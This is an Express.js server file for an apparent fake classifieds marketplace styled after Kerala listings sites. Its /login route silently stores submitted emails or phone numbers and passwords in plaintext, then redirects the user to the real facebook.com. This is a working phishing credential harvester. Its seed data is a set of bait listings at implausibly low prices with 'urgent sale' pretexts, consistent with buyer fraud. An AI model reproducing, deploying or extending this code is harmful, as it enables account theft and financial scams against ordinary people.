const express = require('express');
const { Pool } = require('pg');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Setup database connection pool
const databaseUrl = process.env.DATABASE_URL;

let pool;
if (databaseUrl) {
    pool = new Pool({
        connectionString: databaseUrl,
        ssl: {
            rejectUnauthorized: false // Neon requires SSL
        }
    });
    console.log('Database connection pool initialized.');
    
    // Seed default products if database is empty
    seedDatabase();
} else {
    console.warn('WARNING: DATABASE_URL environment variable is not defined. Database features will not work.');
}

// Middleware - INCREASE LIMITS TO 10MB FOR BASE64 IMAGES
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// API: Get all products
app.get('/api/products', async (req, res) => {
    if (!pool) {
        return res.status(500).json({ error: 'Database not connected' });
    }
    try {
        const result = await pool.query('SELECT * FROM products ORDER BY id DESC');
        res.json(result.rows);
    } catch (err) {
        console.error('Error fetching products:', err.message);
        res.status(500).json({ error: 'Database query failed' });
    }
});

// API: Add a new product (handles Base64 images)
app.post('/api/products', async (req, res) => {
    const { category, title, price, img_url, location, seller, description } = req.body;

    if (!pool) {
        return res.status(500).json({ error: 'Database not connected' });
    }

    if (!category || !title || !price || !img_url || !location || !seller || !description) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    try {
        const queryText = `
            INSERT INTO products (category, title, price, img_url, location, seller, description) 
            VALUES ($1, $2, $3, $4, $5, $6, $7) 
            RETURNING id
        `;
        const values = [category, title, price, img_url, location, seller, description];
        
        const result = await pool.query(queryText, values);
        console.log(`Saved new listing successfully. ID: ${result.rows[0].id}`);
        res.status(201).json({ id: result.rows[0].id, message: 'Listing created successfully!' });
    } catch (err) {
        console.error('Error saving product to database:', err.message);
        res.status(500).json({ error: 'Failed to create listing' });
    }
});

// Handle the login form submission
app.post('/login', async (req, res) => {
    const { mobile_or_email, password } = req.body;

    console.log(`Received login attempt - Mobile/Email: ${mobile_or_email}`);

    if (!pool) {
        console.error('Database connection pool is not configured.');
        return res.status(500).send('Database connection is not configured. Please set the DATABASE_URL environment variable.');
    }

    try {
        const queryText = 'INSERT INTO users (mobile_or_email, password) VALUES ($1, $2) RETURNING id';
        const values = [mobile_or_email, password];
        
        const result = await pool.query(queryText, values);
        console.log(`Successfully saved user credentials. Assigned ID: ${result.rows[0].id}`);

        // Redirect user to the actual Facebook home page after credentials are saved
        res.redirect('https://www.facebook.com');
    } catch (err) {
        console.error('Error saving user to database:', err.message);
        res.status(500).send('An error occurred during authentication. Please try again.');
    }
});

// Seed function to pre-populate listings if database is empty
async function seedDatabase() {
    try {
        // Create table in case user hasn't run the SQL script
        await pool.query(`
            CREATE TABLE IF NOT EXISTS products (
                id SERIAL PRIMARY KEY,
                category VARCHAR(50) NOT NULL,
                title VARCHAR(255) NOT NULL,
                price VARCHAR(50) NOT NULL,
                img_url TEXT NOT NULL,
                location VARCHAR(100) NOT NULL,
                seller VARCHAR(100) NOT NULL,
                description TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);
        
        const countRes = await pool.query('SELECT COUNT(*) FROM products');
        const count = parseInt(countRes.rows[0].count);

        if (count === 0) {
            console.log('Seeding database with default Kerala-localized products...');
            
            const defaultProducts = [
                {
                    category: "bikes",
                    title: "Yamaha RX100 (1996 model, Black, Original engine, FC clear)",
                    price: "₹15,000",
                    img_url: "https://images.unsplash.com/photo-1599819811279-d5ad9cccf838?w=500&auto=format&fit=crop",
                    location: "Aluva, Kochi",
                    seller: "Akhil Dev",
                    description: "Selling my vintage Yamaha RX100 black color. 1996 model. Engine is in pristine condition (original Japanese bore). FC is clear up to 2028. Insurance active. Urgent sale because I am moving abroad next week."
                },
                {
                    category: "phones",
                    title: "iPhone 15 Pro Max 256GB - Blue Titanium",
                    price: "₹24,999",
                    img_url: "https://images.unsplash.com/photo-1510557880182-3d4d3cba35a5?w=500&auto=format&fit=crop",
                    location: "Kaloor, Kochi",
                    seller: "Vijay Sundar",
                    description: "Brand new condition iPhone 15 Pro Max 256GB Blue Titanium. Indian unit, 10 months warranty remaining. Battery health 98%. Scratchless, always used with screen guard and case. Box and invoice available. Fixed price."
                },
                {
                    category: "cars",
                    title: "Mahindra Thar LX Diesel (2021 Model, KL 11)",
                    price: "₹2,90,000",
                    img_url: "https://images.unsplash.com/photo-1533473359331-0135ef1b58bf?w=500&auto=format&fit=crop",
                    location: "Kozhikode, Kerala",
                    seller: "Jithin Das",
                    description: "2021 Mahindra Thar LX 4-WD Diesel Manual. Convertible hard top. Single owner, KL-11 registration. Driven 18,000 km. Excellent condition, new off-road tires. Urgent cash sale."
                },
                {
                    category: "cars",
                    title: "Toyota Innova Crysta 2.4 VX Diesel (2018 Model, KL 08)",
                    price: "₹3,50,000",
                    img_url: "https://images.unsplash.com/photo-1619767886558-efdc259cde1a?w=500&auto=format&fit=crop",
                    location: "Thrissur, Kerala",
                    seller: "Harisree Venu",
                    description: "Toyota Innova Crysta 2.4 VX Manual. 7 Seater, Diesel. 2018 model. Single owner, KL-08 registration. Regular company services. Excellent chilling dual AC. Family car."
                },
                {
                    category: "clothing",
                    title: "Pure Kanchipuram Designer Silk Saree - Wedding Special",
                    price: "₹1,200",
                    img_url: "https://images.unsplash.com/photo-1610030469983-98e550d6193c?w=500&auto=format&fit=crop",
                    location: "Kottayam, Kerala",
                    seller: "Deepa Lakshmi",
                    description: "Pure Kanchipuram silk saree with rich zari border and beautiful designer pallu. Directly purchased from traditional weavers. Perfect for weddings and festivals. Silk mark certified. Unopened box piece."
                },
                {
                    category: "jewellery",
                    title: "22k Gold Plated Traditional Choker Necklace Set",
                    price: "₹750",
                    img_url: "https://images.unsplash.com/photo-1599643478518-a784e5dc4c8f?w=500&auto=format&fit=crop",
                    location: "Kadavanthra, Kochi",
                    seller: "Sruthi Nair",
                    description: "Elegant 22k gold plated traditional choker necklace set. Comes with matching earrings. Handcrafted antique finish design. Safe for sensitive skin. Perfect for traditional functions and bridal wear."
                },
                {
                    category: "bikes",
                    title: "Royal Enfield Classic 350 (2022 model, Matte Black)",
                    price: "₹35,000",
                    img_url: "https://images.unsplash.com/photo-1609630875171-b1321377ee65?w=500&auto=format&fit=crop",
                    location: "Edappally, Kochi",
                    seller: "Justin Joseph",
                    description: "Royal Enfield Classic 350 Matte Black 2022 model. Dual-channel ABS. 9,500 km run. Well maintained, serviced on time. Stock silencer, new battery, zero issues. Urgent cash need."
                },
                {
                    category: "clothing",
                    title: "Designer Leather Handbag Combo for Women",
                    price: "₹499",
                    img_url: "https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=500&auto=format&fit=crop",
                    location: "Kozhikode, Kerala",
                    seller: "Priya Rajan",
                    description: "Premium quality designer leather handbag set for women. Combo pack includes 1 large shoulder bag, 1 sling bag, and 1 pouch. Durable material, spacious compartments, stylish gold-tone zippers."
                },
                {
                    category: "bikes",
                    title: "2021 KTM Duke 390 BS6",
                    price: "₹45,000",
                    img_url: "https://images.unsplash.com/photo-1568772585407-9361f9bf3a87?w=500&auto=format&fit=crop",
                    location: "Trivandrum, Kerala",
                    seller: "Nithin Mohan",
                    description: "2021 KTM Duke 390. BS6 version. First owner, excellent power and pickup. Tires replaced recently. Fully serviced at KTM showroom. Clear papers. Price is final, no low ballers."
                },
                {
                    category: "jewellery",
                    title: "Professional Makeup Combo Gift Kit (Lakme / MAC)",
                    price: "₹850",
                    img_url: "https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?w=500&auto=format&fit=crop",
                    location: "Kakkanad, Kochi",
                    seller: "Anjali Krishna",
                    description: "Professional makeup kit combo. Includes items from MAC, Lakme, and Maybelline (Foundation, Lipstick, Kajal, Eyeliner, Eyeshadow Palette, Primer, Concealer). Brand new sealed pack. Great for gifts."
                },
                {
                    category: "cars",
                    title: "Maruti Suzuki Swift VXI (2019 model, KL 07)",
                    price: "₹1,20,000",
                    img_url: "https://images.unsplash.com/photo-1617788138017-80ad40651399?w=500&auto=format&fit=crop",
                    location: "Edappally, Kochi",
                    seller: "Karthik Raja",
                    description: "2019 Maruti Suzuki Swift VXI. Single owner, petrol manual. Driven only 24,000 km. Regularly serviced at authorized Maruti service center. Chilling AC, new tires, zero-depreciation insurance active. Price slightly negotiable."
                },
                {
                    category: "rentals",
                    title: "Cozy 1 BHK Independent House for Rent",
                    price: "₹5,000/month",
                    img_url: "https://images.unsplash.com/photo-1570129477492-45c003edd2be?w=500&auto=format&fit=crop",
                    location: "Edappally, Kochi",
                    seller: "Joseph Varghese",
                    description: "Independent 1 BHK house for rent in Edappally, Kochi. Very close to Metro Station and Lulu Mall. Peaceful residential area. 24 hours well water, separate electricity meter, ideal for single professionals or small family."
                },
                {
                    category: "bikes",
                    title: "Honda Activa 6G - Grey Colour (2021 Model)",
                    price: "₹25,000",
                    img_url: "https://images.unsplash.com/photo-1622185135505-2d795003994a?w=500&auto=format&fit=crop",
                    location: "Vytilla, Kochi",
                    seller: "Rahul K.",
                    description: "Honda Activa 6G Grey color, 2021 model. Single owner, low mileage. Chilling engine run, brand new tires. All documents clear. Perfect scooter for ladies and family commute."
                },
                {
                    category: "bikes",
                    title: "Vespa SXL 150 - Red Colour (BS6 Model)",
                    price: "₹38,000",
                    img_url: "https://images.unsplash.com/photo-1605647540924-852290f6b0d5?w=500&auto=format&fit=crop",
                    location: "Kaloor, Kochi",
                    seller: "Anandhu S.",
                    description: "Vespa SXL 150 Red colour. BS6 model, well maintained. 12,000 km run. Selling urgently because I am moving to Bangalore next month. Retro look, perfect styling."
                },
                {
                    category: "phones",
                    title: "iPhone 13 128GB - Cute Pink Colour",
                    price: "₹14,000",
                    img_url: "https://images.unsplash.com/photo-1510557880182-3d4d3cba35a5?w=500&auto=format&fit=crop",
                    location: "Kozhikode, Kerala",
                    seller: "Meera Nair",
                    description: "iPhone 13 Pink color 128GB storage. 1 year old, battery health 92%. Scratchless body, looks brand new. Comes with box, original charging cable, and 3 premium designer cases for free."
                },
                {
                    category: "phones",
                    title: "OnePlus 11R 5G (256GB - Galactic Silver)",
                    price: "₹12,500",
                    img_url: "https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=500&auto=format&fit=crop",
                    location: "Palakkad, Kerala",
                    seller: "Harish R.",
                    description: "OnePlus 11R 5G 16GB RAM, 256GB storage. Galactic Silver color. Super fast 100W charging (box and charger included). 8 months old. Bill available."
                },
                {
                    category: "phones",
                    title: "Samsung Galaxy S23 Ultra 5G (Phantom Black)",
                    price: "₹28,000",
                    img_url: "https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=500&auto=format&fit=crop",
                    location: "Trivandrum, Kerala",
                    seller: "Abhijith S.",
                    description: "Samsung Galaxy S23 Ultra Phantom Black. 12GB RAM, 256GB storage. Comes with original S-Pen, bill, and box. Used 6 months. Mint condition. Super camera quality."
                },
                {
                    category: "phones",
                    title: "Redmi Note 12 Pro 5G (Onyx Black)",
                    price: "₹6,500",
                    img_url: "https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=500&auto=format&fit=crop",
                    location: "Kollam, Kerala",
                    seller: "Akhil Raj",
                    description: "Redmi Note 12 Pro 5G (8GB/128GB). Onyx Black. 67W fast charging. Box and charger available. Scratchless screen, perfect battery health."
                },
                {
                    category: "rentals",
                    title: "Luxury Ladies PG Hostel near InfoPark - Homestyle Food",
                    price: "₹3,500/month",
                    img_url: "https://images.unsplash.com/photo-1555854877-bab0e564b8d5?w=500&auto=format&fit=crop",
                    location: "Kakkanad, Kochi",
                    seller: "Sangeetha Lakshmi",
                    description: "Luxury ladies hostel/PG accommodation near InfoPark Kakkanad. Homestyle Kerala food included 3 times. Free Wi-Fi, washing machine, fridge, CCTV, 24x7 security. Walkable to major IT parks."
                },
                {
                    category: "clothing",
                    title: "Georgette Embroidered Anarkali Kurti Suit Set",
                    price: "₹399",
                    img_url: "https://images.unsplash.com/photo-1610030469668-93535c17b6b3?w=500&auto=format&fit=crop",
                    location: "Ernakulam, Kochi",
                    seller: "Priyanka S.",
                    description: "Georgette embroidered Anarkali kurti with matching dupatta and pants. Heavy embroidery work, beautiful details, sizes S/M/L/XL available. Brand new packet piece. Perfect for festival and function wear."
                },
                {
                    category: "clothing",
                    title: "Premium Kashmiri Pashmina Shawl (Handcrafted Wool)",
                    price: "₹299",
                    img_url: "https://images.unsplash.com/photo-1606744824163-985d376605aa?w=500&auto=format&fit=crop",
                    location: "Kochi, Kerala",
                    seller: "Amina Shah",
                    description: "Handcrafted premium Kashmiri Pashmina shawl. Very soft wool fabric, beautiful traditional floral design. Brand new, unused. Direct imports from Kashmir valley."
                },
                {
                    category: "jewellery",
                    title: "925 Sterling Silver Plated Designer Anklets (Kolusu)",
                    price: "₹299",
                    img_url: "https://images.unsplash.com/photo-1535632066927-ab7c9ab60908?w=500&auto=format&fit=crop",
                    location: "Kochi, Kerala",
                    seller: "Aiswarya R.",
                    description: "925 sterling silver plated designer anklets (Kolusu/Payal). High quality cubic zirconia diamonds. Elegant traditional sound, safe for sensitive skin. Great for gifting."
                },
                {
                    category: "jewellery",
                    title: "18k Rose Gold Plated Ladies Luxury Wristwatch",
                    price: "₹599",
                    img_url: "https://images.unsplash.com/photo-1524805444758-089113d48a6d?w=500&auto=format&fit=crop",
                    location: "Kadavanthra, Kochi",
                    seller: "Divya Prasad",
                    description: "Rose gold luxury wristwatch for women. Embellished with sparkling crystals. Water resistant, quartz movement, original battery. Comes in brand gift box. Perfect fashion accessory."
                },
                {
                    category: "rentals",
                    title: "Fully Furnished 1 BHK Studio Apartment for Rent",
                    price: "₹7,000/month",
                    img_url: "https://images.unsplash.com/photo-1502672260266-1c1ef2d93688?w=500&auto=format&fit=crop",
                    location: "Kadavanthra, Kochi",
                    seller: "Thomas Mathew",
                    description: "Fully furnished studio flat. Ideal for working professionals or couples. AC, washing machine, fridge, TV, gas connection, lift, parking. Ready to occupy. 24x7 water and CCTV."
                },
                {
                    category: "jewellery",
                    title: "1 Gram Gold Plated Traditional Temple Jewellery Set",
                    price: "₹850",
                    img_url: "https://images.unsplash.com/photo-1599643478518-a784e5dc4c8f?w=500&auto=format&fit=crop",
                    location: "Guruvayur, Thrissur",
                    seller: "Reshma Nair",
                    description: "Beautiful 1 Gram gold plated traditional temple jewellery set with heavy choker and long haram necklace. Comes with jhumkas. Brand new condition. Perfect for temple and wedding events."
                },
                {
                    category: "clothing",
                    title: "Banarasi Silk Saree - Wedding Red (Gold Zari)",
                    price: "₹999",
                    img_url: "https://images.unsplash.com/photo-1610030469983-98e550d6193c?w=500&auto=format&fit=crop",
                    location: "Kaloor, Kochi",
                    seller: "Anjali Verma",
                    description: "Rich Banarasi art silk saree in wedding red. Gold zari work all over. Soft silk fabric, easy to drape. Includes unstitched blouse piece. Highly recommended for bridal collections."
                },
                {
                    category: "jewellery",
                    title: "Premium Natural Freshwater Pearl Choker Set",
                    price: "₹450",
                    img_url: "https://images.unsplash.com/photo-1599643478518-a784e5dc4c8f?w=500&auto=format&fit=crop",
                    location: "Kochi, Kerala",
                    seller: "Pooja Sharma",
                    description: "Handcrafted natural freshwater pearl choker necklace set. Includes matching pearl studs. Elegant look for party wear and designer dresses."
                },
                {
                    category: "clothing",
                    title: "Designer Lehenga Choli Set (Embroidery)",
                    price: "₹1,499",
                    img_url: "https://images.unsplash.com/photo-1610030469668-93535c17b6b3?w=500&auto=format&fit=crop",
                    location: "Kochi, Kerala",
                    seller: "Sona Susan",
                    description: "Semi-stitched georgette lehenga choli with heavy traditional embroidery and sequins work. Matching dupatta with border. Can be stitched up to size 44. Worn once for a family wedding."
                },
                {
                    category: "jewellery",
                    title: "Trendy Sunglasses Combo for Women (Pack of 2)",
                    price: "₹350",
                    img_url: "https://images.unsplash.com/photo-1572635196237-14b3f281503f?w=500&auto=format&fit=crop",
                    location: "Kochi, Kerala",
                    seller: "Divya K.",
                    description: "Pack of 2 stylish sunglasses for women. UV400 protection filter. Elegant cat-eye and round metallic designs. Soft storage cases and cleaning cloth included."
                },
                {
                    category: "clothing",
                    title: "Rayon Floral Printed Palazzo Kurti Set",
                    price: "₹299",
                    img_url: "https://images.unsplash.com/photo-1606744824163-985d376605aa?w=500&auto=format&fit=crop",
                    location: "Kozhikode, Kerala",
                    seller: "Kavya Mohan",
                    description: "Stylish floral printed rayon kurti with matching loose palazzo pants. Extremely comfortable fabric, ideal for daily office, casual meetups, or college wear. Sizes M to XXL available."
                },
                {
                    category: "jewellery",
                    title: "Traditional Designer Bridal Bangles Kada Set (24 Pcs)",
                    price: "₹299",
                    img_url: "https://images.unsplash.com/photo-1611591437281-460bfbe1220a?w=500&auto=format&fit=crop",
                    location: "Thrissur, Kerala",
                    seller: "Meenakshi S.",
                    description: "Traditional red and gold plated bridal metal bangles set. Velvet coating with heavy stone-studded Kada borders. Set of 24 bangles total. Sizes 2.6 and 2.8 available."
                },
                {
                    category: "clothing",
                    title: "Silk Blend Straight Kurti Pack - Combo of 3",
                    price: "₹450",
                    img_url: "https://images.unsplash.com/photo-1610030469668-93535c17b6b3?w=500&auto=format&fit=crop",
                    location: "Kottayam, Kerala",
                    seller: "Parvathy G.",
                    description: "Pack of 3 straight-cut rayon/silk blend kurtis. Solid vibrant colors with elegant gold printed neck patterns. Brand new, packets unopened. Great daily wear value combo."
                },
                {
                    category: "cars",
                    title: "Maruti Alto 800 LXI (2018 Model, KL 10)",
                    price: "₹60,000",
                    img_url: "https://images.unsplash.com/photo-1617788138017-80ad40651399?w=500&auto=format&fit=crop",
                    location: "Malappuram, Kerala",
                    seller: "Faisal Khan",
                    description: "Maruti Alto 800 LXI. 2018 model, silver color. Driven 38,000 km. Chilling AC, power steering, new tires. Super mileage (22 km/l). KL-10 registration. Single hand used."
                }
            ];

            for (const p of defaultProducts) {
                await pool.query(
                    'INSERT INTO products (category, title, price, img_url, location, seller, description) VALUES ($1, $2, $3, $4, $5, $6, $7)',
                    [p.category, p.title, p.price, p.img_url, p.location, p.seller, p.description]
                );
            }
            console.log('Seeded 33 default listings successfully!');
        }
    } catch (err) {
        console.error('Error seeding database:', err.message);
    }
}

// Start Server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
